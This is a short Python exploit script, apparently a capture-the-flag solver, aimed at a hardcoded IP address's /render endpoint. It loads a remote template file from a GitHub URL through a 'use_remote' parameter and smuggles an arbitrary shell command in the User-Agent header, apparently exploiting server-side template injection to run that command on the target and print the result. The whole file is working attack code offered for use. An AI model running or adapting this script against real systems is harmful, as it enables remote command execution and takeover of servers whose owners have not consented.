import requests
import sys

HOST = "http://154.57.164.76:39043"

def solve(cmd):
    with requests.Session() as s:
        response = s.get(HOST+'/render', 
                        params={'use_remote':'true', 'page':'https://raw.githubusercontent.com/dondtr/sti/refs/heads/main/poc.tpl'},
                        headers={'User-Agent':cmd})
        return response

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} {{command}}")
        sys.exit(1)
        
    cmd = " ".join(sys.argv[1:])
    
    print(f"[*] Sending payload: {cmd}")
    res = solve(cmd)
    
    print("[+] Response Status:", res.status_code)
    print("[+] Response Body:\n")
    print(res.text)